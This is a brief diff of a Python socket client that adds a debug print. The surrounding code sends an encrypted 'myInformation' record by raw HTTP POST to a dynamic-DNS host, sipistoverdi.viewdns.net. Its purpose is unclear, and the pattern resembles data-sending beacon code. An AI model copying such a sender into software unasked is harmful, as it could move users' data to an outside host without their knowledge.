@@ -42,6 +42,7 @@ class requestAPI(create_socks):
 		rcrd.set_Memory = memory
 		rcrd = rcrd.encryptx
 		templates = {"myInformation":createObjects(value=rcrd, mem=memory)}[options_known[self.option]]
+		print(templates)
 		if self.verbose == True:
 			print("[DATA] Sending data. . . | Bytes: %d!. . ."%(len(templates)))
 		self.inh.send(("POST /%s HTTP/1.1\r\x0AHost: sipistoverdi.viewdns.net\r\x0AConnection: close\r\x0AUser-Agent: APISipistoverdiAutomatic-CRAWL\r\x0A\r\x0Aaction=%s"%(options_known[self.option], templates)).encode("utf-8"))
